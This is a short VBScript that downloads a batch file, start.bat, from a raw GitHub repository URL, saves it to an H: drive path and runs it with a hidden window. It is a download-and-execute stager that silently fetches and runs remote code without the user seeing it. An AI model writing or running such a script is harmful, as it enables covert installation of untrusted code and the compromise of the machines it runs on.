dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", "https://raw.githubusercontent.com/Jordan42069/lol/main/Daten/start.bat", False
xHttp.Send
with bStrm
    .type = 1 '//binary
    .open
    .write xHttp.responseBody
    .savetofile "h:\start.bat", 2 '//overwrite
end with
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run chr(34) & "start.bat" & Chr(34),0
Set WshShell = Nothing
